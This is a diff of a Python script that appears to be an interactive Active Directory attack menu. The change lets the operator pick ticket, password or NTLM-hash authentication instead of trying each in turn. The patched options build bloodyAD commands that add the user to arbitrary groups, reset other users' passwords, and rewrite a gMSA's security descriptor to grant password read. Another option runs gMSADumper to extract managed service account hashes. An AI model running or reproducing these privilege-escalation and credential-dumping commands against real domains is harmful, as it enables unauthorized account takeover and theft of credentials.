@@ -4800,23 +4800,26 @@ while True:
 
    if selection == '605':
       AD1 = input("[?] Please enter new group name: ")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")     
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":
+      if methodSelect[:1]=="1":
          try:
             print("[i] Using ticket as credential...")
             localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -k add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
          except:
             print("[-] Failed to add group using ticket...")         
-            try:
-               print("[i] Using password as credential...")         
-               localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p " + PAS.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
-            except:
-               print("[-] Failed to add group using password...")
-               try:
-                  print("[i] Using HASH value as credential...")    
-                  localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p :" + NTM.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
-               except:
-                  print("[-] Failed to add group using HASH value...")               
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")         
+            localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p " + PAS.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
+         except:
+            print("[-] Failed to add group using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash value as credential...")    
+            localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p :" + NTM.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
+         except:
+            print("[-] Failed to add group using hash value...")               
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4831,23 +4834,26 @@ while True:
    if selection == '606':
       AD1 = input("[?] Please enter new users name: ")
       AD2 = input("[?] Please enter new users password: ")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")     
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":
+      if methodSelect[:1]=="1":
          try:
             print("[i] Using ticket as credential...")
             localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set password " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
          except:
             print("[-] Failed to add user using ticket...")
-            try:
-               print("[i] Using password as credential...")
-               localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set password " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
-            except:
-               print("[-] Failed to add user using password...")
-               try:
-                  print("[i] Using HASH value as credential...")
-                  localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "-p :" + NTM.rstrip(" ") + " set password " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
-               except:
-                  print("[-] Failed to add user using HASH value...")                              
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")
+            localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set password " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
+         except:
+            print("[-] Failed to add user using password...")
+      if methodSelect[:1]=="3":      
+         try:
+            print("[i] Using HASH value as credential...")
+            localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "-p :" + NTM.rstrip(" ") + " set password " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
+         except:
+             print("[-] Failed to add user using HASH value...")                              
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4960,51 +4966,27 @@ while True:
       AD1 = input("[?] Please enter MSA users name: ")
       AD2 = "msDS-GroupMSAMembership"
       AD3 = input("[?] Please enter the target SID user value: ")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")     
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":
-         print(colored("[*] Attempting to patch MSA permissions...", colour3))
-         commands = [
-            (
-                "ticket",
-                "bloodyAD --host " + SDM.rstrip(" ") +
-                " -d " + DOM.rstrip(" ") +
-                " -u " + USR.rstrip(" ") +
-                " -k set object " +
-                AD1.rstrip(" ") + " " +
-                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
-                AD3.rstrip(" ") + ")'"
-            ),
-            (
-                "password",
-                "bloodyAD --host " + SDM.rstrip(" ") +
-                " -d " + DOM.rstrip(" ") +
-                " -u " + USR.rstrip(" ") +
-                " -p " + PAS.rstrip(" ") +
-                " set object " +
-                AD1.rstrip(" ") + " " +
-                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
-                AD3.rstrip(" ") + ")'"
-            ),
-            (
-                "HASH value",
-                "bloodyAD --host " + SDM.rstrip(" ") +
-                " -d " + DOM.rstrip(" ") +
-                " -u " + USR.rstrip(" ") +
-                " -p :" + NTM.rstrip(" ") +
-                " set object " +
-                AD1.rstrip(" ") + " " +
-                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
-                AD3.rstrip(" ") + ")'"
-            )
-         ]
-         for method, cmd in commands:
-            print(f"[i] Using {method} as credential...")
-            result = localCOM(cmd)   # should return 0 on success
-            if result == 0:
-               print(f"[+] Successfully patched MSA using {method}.")
-               break
-            else:
-               print(f"[-] Failed to patch MSA using {method}.")
+      print(colored("[*] Attempting to patch MSA permissions...", colour3))
+      if methodSelect[:1]=="1":
+         try:             
+            print("[i] Using ticket as credential...")      
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set object " + AD1.rstrip(" ") + " " + AD2 + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'")
+         except:
+            print(f"[-] Failed to patch MSA using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...") 
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2 + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'")
+         except:
+            print(f"[-] Failed to patch MSA using password...")  
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash value as credential...")          
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2 + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'")
+         except:
+            print(f"[-] Failed to patch MSA using hash value...")  
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -5018,22 +5000,26 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '609':
-      SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":
-         print(colored("[*] Attempting to dump the MSA HASH...", colour3))
-         commands = [
-            ("ticket", keyPath + "gMSADumper.py -k -d " + DOM.rstrip(" ")),
-            ("password", keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ")),
-            ("HASH value", keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" "))
-         ]
-         for method, cmd in commands:
-            print(f"[i] Using {method} as credential...")
-            result = remoteCOM(cmd)
-            if result == 0:
-                print(f"[+] Success using {method}.")
-                break
-            else:
-                print(f"[-] Failed using {method}.")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Attempting to dump the MSA HASH...", colour3))
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            remoteCOM(keyPath + "gMSADumper.py -k -d " + DOM.rstrip(" "))
+         except:
+            print(f"[-] Failed to dump MSA has using tcket...")  
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")
+            remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" "))
+         except:
+            print(f"[-] Failed to dump MSA has using password...")           
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash value as credential...")
+            remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" "))
+         except:
+            print(f"[-] Failed to dump MSA has using hash value...")    
       prompt()
       
 # ------------------------------------------------------------------------------------- 
